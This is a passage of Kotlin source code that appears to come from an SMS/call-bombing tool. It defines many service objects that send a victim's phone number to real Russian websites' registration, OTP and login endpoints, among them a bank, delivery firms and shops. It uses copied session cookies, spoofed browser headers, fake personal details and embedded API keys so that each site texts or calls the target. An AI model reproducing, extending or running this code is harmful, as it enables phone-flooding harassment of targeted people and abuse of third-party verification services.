                "gid=eyJpdiI6IlJBL3liZFpRYkRVWWVWSi9CRVdyQ0E9PSIsInZhbHVlIjoiNzJ2eWVBMnJCblFKcm4vQzhIOWFBTVA3a0drTkI5clF2bnhLaE9WdFdBclRnNGJYbGpKc2d3c1RQL3YzZUp3eWJCQklFTUJIWU9UelhhODhwRXdaaGdLUFpkZzlzODVSRHhRcm9IaEpiNjg9IiwibWFjIjoiMjdiZDJkY2QxZmMyMDRmZjViYjdkMzk1Zjg4Njk0OTQ2OGE0NDJlYzEzODRhYjU2MTkwZTY1NWJmZDFiOTRhNCIsInRhZyI6IiJ9; show_mobile_block_app_2=eyJpdiI6IlJiZ0tqK1lOVEZqdzVEZldhRFJmZ3c9PSIsInZhbHVlIjoiOFJQY1RSdlR3a3RYaDhGZExpalF5TzdOd1B5ZmZUTkt0MEg4cUcweG1HcUFDall3VFBHcGdpd3RmalUzd1MyYyIsIm1hYyI6ImM3NzU0OWM2ZjIyZDc0YWIzYzI0OTU0NjUzM2Q2MDhhOTVkMThlMTBiZDg1YTc1MDA5YmEzYmViNTkyYmM1ZTMiLCJ0YWciOiIifQ==; tmr_lvid=d046a1a213cc8bbe63676e94de623dc7; tmr_lvidTS=1680709392744; XSRF-TOKEN=eyJpdiI6IjE1bmg1bjhYOFVhU1lRMFpZMC9SaFE9PSIsInZhbHVlIjoiMHFDTll1Y1lxNCt5dlMzSFI3enhkdUhoUjBsbENZSWtPdDFEUGplK3d0Um1aelJHVERLSGVJWWJpUFJCUDVjbzF6RWo0K1NkVGZaaWtaeGFnMHdRc21nNEhvd0huZEVoSGRCU0FQSmF1Q2VndzBHZ3QzOWk5SmxmSjN3T1ZUTXUiLCJtYWMiOiJiNzlkMWI3MjEzMmMxMGZlZDI5Y2Y2NWY1MDUzYjQ1ZTgwYWQzNjM1NTFhYjRhYmVkYzdkZGI3ZDJiOTZmMjU2IiwidGFnIjoiIn0=; xvalovskie_vody_session=eyJpdiI6InIvMnVHSjBOcWl2bTFjOU03QjNBVWc9PSIsInZhbHVlIjoiWFBGZ2oyVmp4d2xYS3FaSkNPZEZrTEJNUzNEcmFwU0pUOTBnVTIxWFdlWnJ1Tll4VStvdkxXRU0vK3l4RVhwMXF5RnBaVjVoaldMRkpJOVg0YVNDREc5TUg5dzBENiswYitjTCtHZytnaWNsRlJZSEw1QXJCYWp3dG5xWncwbXYiLCJtYWMiOiJmNjZlMDQ2YmUzOWY2NGMyZTY1Y2ViZDU5MzZiZDdlY2NkYmZhM2U1ZGFjZjI4N2VmZTk2ZDdkMjYyNTU5ODAxIiwidGFnIjoiIn0=; wcid=eyJpdiI6IitFVGZvQzJFK1VmQzUvaGcySWhiNEE9PSIsInZhbHVlIjoiNWNFeVJ2U05sUWthNGVjOTdZVzMxUDlWQnhZeC9ST3JML2FJbHNmaUllT1ZDVWFWaXFpZVI5SThpQlRnMkhEQSIsIm1hYyI6IjhhNTU0ZGFlYTZjYzcwMGI1ZWM0MTAzNmU3NDMxZmYyMTE5N2Q2YjcwZGNlYjYzNTc3ZjUxOGVhZjYxMTliOTgiLCJ0YWciOiIifQ==; _ga=GA1.2.664543174.1680709393; _gid=GA1.2.1486154669.1680709393; _gat_gtag_UA_44138349_1=1; _ym_uid=1680709393637923039; _ym_d=1680709393; _ym_visorc=w; _ym_isad=2; cted=modId=7ed2229d;client_id=664543174.1680709393;ya_client_id=1680709393637923039; tmr_detect=0|1680709399967"
            )
            builder.add("phone", format(phone.phone, "7(***) ***-****"))
        }
    },

    object : FormService("https://rf.driptip.ru/signup/", 7) {
        override fun buildBody(phone: Phone) {
            request.header(
                "Cookie",
                "__ddg1_=ZmQtjxk6pvG7jkNta5vd; PHPSESSID=vmpoeb2lj1g04fbhatcg6e7rd0; landing=/signup/; buyerstat__id=642d97ec83b5e; user_agent=desktop; _ym_uid=1680709614211847501; _ym_d=1680709614; _ym_isad=2; _ga_FN3XP284GB=GS1.1.1680709614.1.0.1680709614.0.0.0; _ga=GA1.2.1147869418.680709614; _gid=GA1.2.1503340979.1680709614; _gat_gtag_UA_56207650_1=1"
            )
            request.header("x-requested-with", "XMLHttpRequest")
            builder.add("data[firstname]", userName)
            builder.add("data[email]", email)
            builder.add("data[phone]", "+$phone")
            builder.add("data[birthday][day]", "14")
            builder.add("data[birthday][month]", "4")
            builder.add("data[birthday][year]", "2001")
            builder.add("wa_json_mode", "1")
            builder.add("need_redirects", "1")
            builder.add("contact_type", "person")
        }
    },

    object : MultipartService("https://api.nbcomputers.ru/api/user/registration", 7) {
        override fun buildBody(phone: Phone) {
            builder.addFormDataPart("phone", format(phone.phone, "+7 (***) ***-**-**"))
        }
    },

    object : Service(7) {
        override fun run(
            client: OkHttpClient,
            callback: Callback,
            phone: Phone
        ) {
            client.newCall(
                Request.Builder()
                    .url("https://api.nbcomputers.ru/api/user/registration")
                    .post(
                        """
    ------WebKitFormBoundaryAhgEzNl6lSOnl6vr
    Content-Disposition: form-data; name="phone"
    
    ${phone.format("+7 (***) ***-**-**")}
    ------WebKitFormBoundaryAhgEzNl6lSOnl6vr--
    """.trimIndent().toRequestBody("multipart/form-data; boundary=----WebKitFormBoundaryAhgEzNl6lSOnl6vr".toMediaType())
                    )
                    .build()
            ).enqueue(callback)
        }
    },

    object : JsonService("https://online.sberbank.ru/CSAFront/uapi/v2/authenticate", 7) {
        override fun buildJson(phone: Phone): String {
            request.header("Accept", "application/json, text/plain, */*")
            request.header("Origin", "https://online.sberbank.ru")
            request.header("Sec-Fetch-Dest", "empty")
            request.header("Sec-Fetch-Mode", "cors")
            request.header(
                "sec-ch-ua",
                "\"Chromium\";v=\"102\", \"Opera GX\";v=\"88\", \";Not A Brand\";v=\"99\""
            )
            request.header("sec-ch-ua-mobile", "?0")
            request.header("sec-ch-ua-platform", "\"Windows\"")
            request.header("Sec-Fetch-Site", "same-site")
            request.header("Referer", "https://online.sberbank.ru")
            request.header(
                "Cookie",
                "f5avraaaaaaaaaaaaaaaa_session_=LMKFMKCFCKBBCDHGIDBNHFEIFEBIIGCKJNNOLHNDNDGPOAIPMNBMFDPHMKNGKLCPGCKDFLKHOKEMKLDNJGJAAEBFHJPHHJJDNMHIDFMAICPGDHENNNCDBCKOMIEHDHJL; ESAWEBJSESSIONID=PBC5YS:-1592978582; ESAUAPIJSESSIONID=PBC5YS:-1401443471; TS0135c014=0156c5c8603d42898e476b45b51aabb2a8f79520eb39fba20032e067b52aeec7ca69ebbd8e169e3274802a949082e444146ea45b28ce3e31994e88487c5b66404b08a8d711091f5821afd2f2c333998ed232338bd8; sbid_save_login=false; TS014759d1=0156c5c8600f8ab0efc50bbb13a458c79226cd158039fba20032e067b52aeec7ca69ebbd8e873067a3be306fcf1fc744b54d4fae7ea19aa19b71ab2d7c1a36faf61b452febc67f38094bdf208b5aef292d91cf61858a8abeb0a2798801e862233cdc7c50e433360f80eed46e6358c40efad04d37b5514d2adc9e428b8ab16be5a1a422bef8; _sv=SA1.8ed47a79-c4ce-4990-a3b9-702d969ab535.1670155776; _gcl_au=1.1.1368651913.1680710321; _ym_uid=165997501787354883; _ym_d=1680710321; _sa=SA1.415cad68-bd50-44ad-9873-3e21cca1b7e0.1680710321; tmr_lvid=fe45132553fe9d1cacfd3293ecfac8c2; tmr_lvidTS=1659975017497; _ym_isad=2; top100_id=t1.3122244.1104513110.1680710321533; adtech_uid=4cb771be-35b5-4398-bda2-a2e5bec91512:sberbank.ru; adrdel=1; adrcid=A2h_BfB_cAeLGOfEv5sJZFw; t2_sid_3122244=s1.362560733.1680710321535.1680710325559.1.11.11; JSESSIONID=node0elr4dl5la6p3opwxbogk0eyh11444053.node0; sb-sid=26aca1a7-e98d-4ce8-bb37-dbcec0970f2c; sb-id=gYEl6L3DkLtDBreaGke0twO_AAABh1IkW1O0fIbpW5dFW7L4ClXYigu3JP0qgdT-kxg3jxH0E-gpnTI2YWNhMWE3LWU5OGQtNGNlOC1iYjM3LWRiY2VjMDk3MGYyYw; sb-pid=gYFSXfnWV2pE4ISEQGXI82ccAAABh1IkW1N_DuqFUvibhqECoTB97tQmdGCXZcmJ-ADw9w9aiOYIIA; _sas=SA1.415cad68-bd50-44ad-9873-3e21cca1b7e0.1680710321.1680710329; UAPIJSESSIONID=node0o03mgi79yllsawxtnl4r6bl42517498.node0; sbrf.pers_sign=0; TS019e0e98=0156c5c860b7d7da03b7f51385dfd60554e906c61039fba20032e067b52aeec7ca69ebbd8e873067a3be306fcf1fc744b54d4fae7ea19aa19b71ab2d7c1a36faf61b452feb3440e06dc44ae286826814333a90a448c21074fa0c6a00cbcc07555a8192f2dc2740c50a7597ab671ba789c6aeb5f4bcbd66982f6eafeb75b46ddcfd2b3f6a9c; TS019a42f2=0156c5c860a908faaa555abcfe63a6befa9aa5458439fba20032e067b52aeec7ca69ebbd8e873067a3be306fcf1fc744b54d4fae7ea19aa19b71ab2d7c1a36faf61b452febc67f38094bdf208b5aef292d91cf61858a8abeb0a2798801e862233cdc7c50e4599951af491f02d3f381bc84a363ed3f776296a421fb2d06ab15559b314bc92e; TS019e0e98030=01e9874edf1cfda0bef4ced6a4d030508452c212d7ee41ebe13a58632b85bbea9ba07dc27259da1f260d5df6c39fd7a0e483ad940c; TS3bb85bd7027=08bd9624b8ab2000660a77af35bf89cf80ffc33769930767dc909391c1385ce25ef34e54dec1cef708bb4760f51130003f1023d9e81eb651e6a03b158cdb4d0514bd448afa45a2f9fd46dac25d2c3585e1c35c3256791b2661002600e2cd6b48"
            )
            request.header("Process-ID", "b356eea04fdf424a8a14337113d22631")
            request.header("X-TS-AJAX-Request", "true")
            return "{\"identifier\":{\"type\":\"phone\",\"data\":{\"value\":\"$phone\"}},\"authenticator\":{\"type\":\"sms_otp\",\"data\":{}},\"channel\":{\"type\":\"web\",\"user_type\":\"private\",\"data\":{\"rsa_data\":{\"dom_elements\":\"\",\"htmlinjection\":\"\",\"manvsmachinedetection\":\"\",\"js_events\":\"\",\"deviceprint\":\"version=1.7.3&pm_br=Chrome&pm_brmjv=108&iframed=0&intip=&pm_expt=&pm_fpacn=Mozilla&pm_fpan=Netscape&pm_fpasw=internal-pdf-viewer|internal-pdf-viewer|internal-pdf-viewer|internal-pdf-viewer|internal-pdf-viewer&pm_fpco=1&pm_fpjv=0&pm_fpln=lang=ru|syslang=|userlang=&pm_fpol=true&pm_fposp=&pm_fpsaw=1536&pm_fpsbd=&pm_fpsc=24|1536|864|816&pm_fpsdx=&pm_fpsdy=&pm_fpslx=&pm_fpsly=&pm_fpspd=24&pm_fpsui=&pm_fpsw=&pm_fptz=3&pm_fpua=mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/108.0.0.0 safari/537.36|5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36|Windows&pm_fpup=&pm_inpt=&pm_os=Windows&adsblock=0=false|1=false|2=false|3=false|4=false&audio=baseLatency=0.01|outputLatency=0|sampleRate=44100|state=suspended|maxChannelCount=2|numberOfInputs=1|numberOfOutputs=1|channelCount=2|channelCountMode=max|channelInterpretation=speakers|fftSize=2048|frequencyBinCount=1024|minDecibels=-100|maxDecibels=-30|smoothingTimeConstant=0.8&pm_fpsfse=true&webgl=ver=webgl2|vendor=Google Inc. (AMD)|render=ANGLE (AMD, AMD Radeon(TM) Graphics Direct3D11 vs_5_0 ps_5_0, D3D11)\"},\"oidc\":{\"scope\":\"address_reg birthdate email mobile name openid verified\",\"response_type\":\"code\",\"redirect_uri\":\"https://profile.sber.ru\",\"state\":\"43c54272-1a34-4c6f-a470-52bd53bd1e1c\",\"nonce\":\"34c136bb-7f07-492b-8f13-3d162a5ae7ba\",\"client_id\":\"2679efe6-f358-4378-b328-45dfcc4a006a\",\"referer_uri\":\"https://profile.sber.ru/\"},\"browser\":\"Chrome\",\"os\":\"Windows 10\"}}}"
        }
    },

    object : ParamsService("https://apis.flowwow.com/apiuser/auth/sendSms/") {
        override fun buildParams(phone: Phone) {
            builder.addQueryParameter("phone", "+$phone")
            builder.addQueryParameter("user_type", "client")
            builder.addQueryParameter("lang", "ru")
            request.header("Sec-Fetch-Dest", "empty")
            request.header("Sec-Fetch-Mode", "cors")
            request.header(
                "sec-ch-ua",
                "\"Chromium\";v=\"102\", \"Opera GX\";v=\"88\", \";Not A Brand\";v=\"99\""
            )
            request.header("sec-ch-ua-mobile", "?0")
            request.header("sec-ch-ua-platform", "\"Windows\"")
            request.header("Sec-Fetch-Site", "same-site")
            request.header("Referer", "https://flowwow.com/")
            request.header("Origin", "https://flowwow.com")
        }
    },

    object : JsonService("https://www.cdek.ru/api-site/auth/send-code", 7) {
        override fun buildJson(phone: Phone): String {
            request.header(
                "Cookie",
                "_ym_uid=1681049809433520032; _ym_d=1681049809; _ym_isad=2; cityid=1759; sbjs_migrations=1418474375998=1; sbjs_current_add=fd=2023-04-09 17:16:49|||ep=https://www.cdek.ru/ru/|||rf=(none); sbjs_first_add=fd=2023-04-09 17:16:49|||ep=https://www.cdek.ru/ru/|||rf=(none); sbjs_current=typ=typein|||src=(direct)|||mdm=(none)|||cmp=(none)|||cnt=(none)|||trm=(none); sbjs_first=typ=typein|||src=(direct)|||mdm=(none)|||cmp=(none)|||cnt=(none)|||trm=(none); sbjs_udata=vst=1|||uip=(none)|||uag=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36; sbjs_session=pgs=1|||cpg=https://www.cdek.ru/ru/; _ym_visorc=b; _ga=GA1.2.778360079.1681049810; _gid=GA1.2.629305455.1681049810; _gat_UA-4806124-1=1; tmr_lvid=7653af96d3bc11f6b8066e3ac0663428; tmr_lvidTS=1681049809839; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session={\"deviceGuid\":\"bb0643e8-bc08-4838-bf34-5b23a4221287\"}; _fbp=fb.1.1681049809933.1196859599; popmechanic_sbjs_migrations=popmechanic_1418474375998=1|||1471519752600=1|||1471519752605=1; _tt_enable_cookie=1; _ttp=j567hcxgZMrL8i_BzsrwDS81Zl3; flomni_5d713233e8bc9e000b3ebfd2={\"userHash\":\"b7ea40fa-0bfe-491f-bbae-f151c2a9810e\"}; tmr_detect=0|1681049812179"
            )
            return "{\"locale\":\"ru\",\"websiteId\":\"ru\",\"phone\":\"+$phone\",\"token\":null}"
        }
    },

    object : FormService("https://citystarwear.com/bitrix/templates/bs-base/php/includes/bs-handlers.php", 7) {
        override fun buildBody(phone: Phone) {
            request.header(
                "cookie",
                "PHPSESSID=UuKiYPniPAdXVBBtNljDS7UPZdha49Cc; I_BITRIX2_SM_bsSiteVersionRun=D; I_BITRIX2_SM_SALE_UID=fa184708de2bc9dd79e83a8055c6177d; _ga=GA1.2.2134493673.1681050316; _gid=GA1.2.1923476411.1681050316; _gat=1; _gat_gtag_UA_107697781_1=1; _ym_uid=1681050316671922748; _ym_d=1681050316; tmr_lvid=b8f88e748040d447a7dd09460adb4d95; tmr_lvidTS=1681050315683; _ym_isad=2; _ym_visorc=w; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; roistat_visit=184510; roistat_first_visit=184510; roistat_visit_cookie_expire=1209600; cto_bundle=29NzTF9uUDJTYWo2N0E1QWJTVm9FZnZTd2FTTDk1SFNjN2dYdG0wb0s4bFNkNktnZHpMa1ElMkJybCUyQnUlMkJ5SHA4aEtZWUozSXpaRWowSXZtRUVuYmF6MFdsNDBhaFJsM2VIVnRzUTUlMkZCdFpmM0JIVDJjbXcyeHJmMXdCMEhsN1dqVks1OGhs; roistat_cookies_to_resave=roistat_ab,roistat_ab_submit,roistat_visit; ___dc=975af4da-b307-4c03-a397-86b1121a74e1; tmr_detect=0|1681050317970;"
            )
            builder
                .add("phone", phone.phone)
                .add("hdlr", "bsSendCallCode")
                .add("key", "DOvBhIav34535434v212SEoVINS")
                .add("dataForm[phone]", phone.phone)
                .add("dataForm[callNums]", "")
                .add("dataForm[smsCode]", "")
                .add("dataForm[email]", "")
                .add("dataForm[ecode]", "")
                .add("O3Clz", "ZXrHlWj8wGf8qVwyImyJnbYZY")
                .add("7UxNZ", "1wYb5BjwpiyXHUWijh8vdvMj8")
                .add("Bvmeh", "lgrCt3RBmF2iB9Q8rV3KCM2fT")
                .add("7Mwtq", "Ll4RkH341728SQPCZ4mrjo7AD")
                .add("05NkY", "Shtl9WZihZuuMY43uUcF4TqJ2")
                .add("N9n3d", "cQibFHON1g0i3yOHLsOjhv0pW")
                .add("KNaaw", "02UVQnrFFLxTD1EJ2Q7X9YeGo")
                .add("33f0Q", "QbpHWRptZudzLK88H5uhLnPuB")
                .add("NLqjP", "V2KdwIrmw09pQJRSWXUwM2PuU")
                .add("JqHV2", "aKmpJNgOHDoJrZ8xLT7vMaJur")
        }
    },

    object : FormService(" https://lk.zaim-express.ru/Account/RegisterCode", 7) {
        override fun buildBody(phone: Phone) {
            request.header(
                "Cookie",
                "_ym_uid=1677588936312422059; _ym_d=1677588936; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session={\"deviceGuid\":\"bb0643e8-bc08-4838-bf34-5b23a4221287\"}; _ze_visiter=BBD44883-7DB0-4BC4-B331-D9DFF8B24051; _ze_referer=https://www.google.com/; _ze_referer_time=20230409174230; tmr_lvid=ccd00df5ac74424a769b5f262a180818; tmr_lvidTS=1681051352238; _gid=GA1.2.1372097639.1681051352; _ym_isad=2; _ym_visorc=w; _hjFirstSeen=1; _hjIncludedInSessionSample_1926565=0; _hjSession_1926565=eyJpZCI6IjIwZTRlNGUzLWYyZGEtNDU3Ny1hYmU2LTE1NzBhZmIzMWRlOCIsImNyZWF0ZWQiOjE2ODEwNTEzNTI1ODIsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1; _fbp=fb.1.1681051353018.215763853; .LoanExpress.Session=CfDJ8LfbWLtL0iJEnA0TxaiJ2NXj/r2yRlFi4x5VQREdNf5rsUkJ3yrU0uIPYDOOVYLU/C/PWLoS5/xKXvaSSq2utdGI2yjNGbF3sWP46CSPy+zQGanUtzm+5YlNbuuNf//3P/4KMx7W0tHxpoHfgndbKMI1oDvVdWhhTr9WjyyVEvam; .AspNetCore.Antiforgery.YwBUPdAxP0c=CfDJ8LfbWLtL0iJEnA0TxaiJ2NV4Bc9G7NXmZcZmkkLtB2B7VGzfoEOtyG_8I9hFphEjDvJN_4Ob27RarXU-QuVoBiv1THQCjjXJcMdvm6LtB5etVecQy1OzJY5Nc3s7YTuWzIyFWE2RrGNP9utz2vYmsMA; pt_s_2f1af163=vt=1681051367413&cad=; _hjSessionUser_1926565=eyJpZCI6Ijk2MzliZmQ3LWY4M2EtNTYyZC1iNmFjLWE0ZGMzZDAzM2M1OSIsImNyZWF0ZWQiOjE2ODEwNTEzNTI1NzAsImV4aXN0aW5nIjp0cnVlfQ==; pt_2f1af163=deviceId=b11694e8-3a40-4cd2-a0ad-55697497f002&sessionId=771fabc0-5c53-4c4e-84ca-0a96929437d7&accountId=&vn=1&pvn=2&sact=1681051368744&; _ga_2JB47PMSVE=GS1.1.1681051351.3.1.1681051369.0.0.0; _ga=GA1.2.1772293061.1677588936"
            )
            builder.add("CellNumber", phone.format("+7 (***) ***-**-**"))
        }
    },

    object : JsonService("https://sushisell.goulash.tech/api/user/register", 7) {
        override fun buildJson(phone: Phone): String {
            request
                .header("uuid", "d87a7be3-a23e-720b-d51b-2f23a0d21ff6")
                .header("sitenew", "1")
                .header("x-api-key", "5349854")
            return "{\"phone\":\"" + phone.phone + "\",\"password\":\"qwertyuiop\",\"password_repeat\":\"qwertyuiop\",\"verify_type\":\"call\"}"
        }
    },

    CurlService(
        """
                        curl 'https://24htv.platform24.tv/v2/otps' \
                          -H 'authority: 24htv.platform24.tv' \
                          -H 'accept: application/json, text/plain, */*' \
                          -H 'accept-language: ru-ru' \
                          -H 'content-type: application/json' \
                          -H 'origin: https://24h.tv' \
                          -H 'referer: https://24h.tv/' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: cross-site' \
                          -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \
                          --data-raw '{"phone":"{full_phone}"}' \
                          --compressed
                          """.trimIndent(), 7
    ),

    CurlService(
        """
                        curl 'https://bankok.akbars.ru/identityabo/anonymousFlow/init' \
                          -H 'Accept: application/json, text/plain, */*' \
                          -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'Access-Control-Allow-Headers: *' \
                          -H 'Connection: keep-alive' \
                          -H 'Content-Type: application/json' \
                          -H 'DeviceToken;' \
                          -H 'Origin: https://online.akbars.ru' \
                          -H 'Referer: https://online.akbars.ru/' \
                          -H 'Sec-Fetch-Dest: empty' \
                          -H 'Sec-Fetch-Mode: cors' \
                          -H 'Sec-Fetch-Site: same-site' \
                          -H 'SessionToken;' \
                          -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          --data-raw '{"phone":"{phone}"}' \
                          --compressed
                          """.trimIndent(), 7
    ),

    CurlService(
        """
                        curl 'https://api.sushcof.ru/api/user/register' \
                          -H 'authority: api.sushcof.ru' \
                          -H 'accept: application/json, text/plain, */*' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'content-type: application/json;charset=UTF-8' \
                          -H 'origin: https://www.eda1.ru' \
                          -H 'referer: https://www.eda1.ru/' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: cross-site' \
                          -H 'sitenew: 1' \
                          -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \
                          -H 'uuid: 2efbac03-8334-cf57-8c07-4b6e2f2b2113' \
                          -H 'x-api-key: 12078554' \
                          --data-raw '{"phone":"{phone}","password":"йцукенгшщз","password_repeat":"йцукенгшщз","verify_type":"call"}' \
                          --compressed
                          """.trimIndent(), 7
    ),

    CurlService(
        """
                        curl 'https://beloris.ru/ajax/users/send_sms_login' \
                          -H 'authority: beloris.ru' \
                          -H 'accept: application/json, text/plain, */*' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'beloris-token: 4e0a565574502dd315584521af7445c7' \
                          -H 'content-type: application/json;charset=UTF-8' \
                          -H 'cookie: __ddg1_=jhfmggAwDzyS5PkJJDO5; _ga=GA1.2.1989106947.1682855671; _gid=GA1.2.408857361.1682855671; _gat_gtag_UA_37474329_1=1; _gcl_au=1.1.1605059988.1682855671; beloris_ab_groups=eyJpdiI6IkhJTjdtRGpmZVp5MmQ2ODRrYmRYekE9PSIsInZhbHVlIjoiYnlZMnpEOFA2aDhSNHVSbVZiREltTUVkUk51aHZ4cHFnQVNPTUZ5c3ROZ243OFA4bXN4Q1Q2S1VrTTNGTUx0NTRxU3Q0OFBoTGM1SlZwbVpGUVwvY3NBPT0iLCJtYWMiOiJkNWI1Y2YzZmVkNjM5MmUwZWFjMDRmYjczZTNhY2ZlMTViZWZlZGNlYjYwNWI1MDQ1MWYzODZmYjE0NzcwMzgyIn0%3D; _dc_gtm_UA-37474329-1=1; _ym_uid=1682855671367194138; _ym_d=1682855671; _ym_isad=2; _ym_visorc=w; flocktory-uuid=b050056d-2eff-4897-a579-2d45f8e3a78e-4; beloris_session=eyJpdiI6Ik52bmlkYURMOGJNWDlBZGN0NlhmU1E9PSIsInZhbHVlIjoiZlFaVUhLOUxFNXJQNlFPdHl0TkYwS1JrT0pVdVBEUEp6ZWV0STlhejN3dWU1WlBkNnhNZElcLzI1RDlYRlBBbFdKZ3RWNXVJWWJZbmdNXC9IXC9ycWl2b0pYXC84REtzcGNycWsyY0dkbTNVZEVQdmVsbGRlTnI2TGFYZHdRd1pJd3E2IiwibWFjIjoiOGJmZDUyZTA3OGQ5MTg1Y2M0YmM4OWM5MWUxN2Y2MjU2ZTBhMDFlNzlkNDQ0NTY4OTZhN2FjMmZjMTZkODE5MiJ9; BLUSHIP=eyJpdiI6IkRObU4xRjlwWStCVU9BUEZHVTdkamc9PSIsInZhbHVlIjoiaDYwQ1ZUcHhocWJwdWs4dnFmXC9OWlpZYm13ZVJwaVNMdkt4K0dxc2RtVGplZWpXWHkrRUVZMHFJRzgzT0xwV1FZZmxUVzVYVGp1OVBaK21sc2JnMnBmeWZyT2doOFJrdFJUbDAydGtRdmtnZjZqczJuRzUreEZRZkpSWlZWdCtOSjlmSHN0K0FqMG80QWpIN1NWNmdjWG9ERGg2WFF4VkJyU0tSajNPYncyUEJ3Wm9WZUk4bjY4ZkxDTnpNaDZHd3JFSlJWQlJNZGkzNzBVRytTcExISUpjdnVoM2ptWFcxQ1lJNDJPOHJYOEFHeGNkUElPbDRybUc0NllJMlVEMVwvQTEySnQxaUd6Ykk2Tkp2RUx5YUUwWldUcmMwQkxERm02THBuMVBoVkNoNTU0aEVvUFZOb2V0M0ZQeXl2bVY3R0xwSVdvazU0aFFWYllvNWhsV3ZSTXJ5MituSXBKRnUrV1ZFdEU5MVlwQlhLT01GS0FUcnFkMzFYSFZBTFVGQ3QyN1orV2FBXC9RREJzVjkrZGJySWx4VktIRkVQdGlVUWp3QTc2Ykd1dmVcLzZwWXdEaE0xUUNiSXgrNGxjcldscDdKK0lrRVozRlhseFpndlY3OFE3N1E5TDJoUkU4VXRsTkM4YVdnSFhkM0hKVUtGc3c4bUk1RWltTGpUd3lIb0NcL3lka0lDOHZaTnY1UktiZHJiWTF1SmI2WllIVHl3VW81Vldhd2lXRnBcL09PS1Y1UmlYY241UllZRjQ0Tll1N3NXUDlNS0RIMElPNUJEdTVzMUhmazBXa1Rwc0IyUXlDNjQwRlpHSlZFR2FQa0wrcW84cDFwU2xSY2hhaEZPU29KM1Viam1GcERoUjZoRm9qeVwvOXVlQnl3OTlXOW04UG5cL1RpeEVzM0FyYmUrUWhqa3RySUlQZWZvMTNNRVd3NlRcL3QxZlR3akR4ZDhzU3V3Rnh6eThTYlJnUlF4UktDZjMxM3FRV0psc0lLcXFjQWRQU2dVQzBYRzl1VzEwXC9yT2xMQ0xUR1UxOVJpUXo2ZjZCbWpEUFNYY2pmNnNySmhJNitUMTVyNTd1YmJMRXBzZnZ6ckNcL0lmZ2g5ZmhYaVV4MFVOaElpNUdMVGw4Z0k0VkhGcWw5c1daVGtua0UweDBoRWNzRVwvRFwvT2kwSnZYVndyQWg5QWJIWEpyOUhLXC9LOXcrQUFPalVaNURwUWlNY0Zvc1VJK3ZcL3pLTkNHSitqdlBuNVc4d25JYzJsQldTeTFKeE5MenVVYlNETEU3WlBzK29yWXpjdVE2TzR2K0lkeWhlWGlBYjA2Q3ZoN282Q3RuTDVKMzJ1SW1cL3lFYTV6bnBhT0ZHRjFlZ0FQQUNFNEdjdzFEdkRuK1p3OVJwMWxBSWlTSlhKTUdRbHJOZnROUUxlcjdiamJaT25NQnNxUFwvWERxT0lLWHZkNkhVeU9tNjNqVG5EZEh6UXBPU1wvajFxYjZCQmIwb1ZMK1YwR1dVd2pHTXVybm1jYUJXUmJScmVpQ3piMURmT3lyVTMzQVZSXC9acVgxVGJhYklCbUw1cE4zWExUeExzWCtKNkMxNlA0bFlvYTJ5bXY5ZlpvcHRwTVBuNk9wMGM5aFcrclZyUEc3bW53OXpJV2wrTlNtc3Jkamw4SjJpZDB4K2RWMzBvSUxqQVJ4WHBNNmo3XC9OT0I4U1pqYmVzWnpxZ2p4VVBHckRjR2taXC9wamxWNGxvT1VzS094RTRMeHlUMGYwanRFXC9abEY5dFwvc1ZSN3lsb1FXR3pcLzJcLzNRRVgzU0tzWEFHZUZlNiIsIm1hYyI6IjFhZTI2NmU2MGVlMWI0OGVmYjM4ZWM5NGRjNWIzNTgxZmE3YmI3NTQzMTdmN2FmOTEyYTA4YzcxYzgxNTExNTMifQ%3D%3D' \
                          -H 'origin: https://beloris.ru' \
                          -H 'referer: https://beloris.ru/?r=0.6576217973266996' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: same-origin' \
                          -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \
                          -H 'x-beloris-ismobile: false' \
                          -H 'x-bl-trust-key: ded232fa325402b384c18d9290af6ea8' \
                          -H 'x-csrf-token;' \
                          -H 'x-requested-with: XMLHttpRequest' \
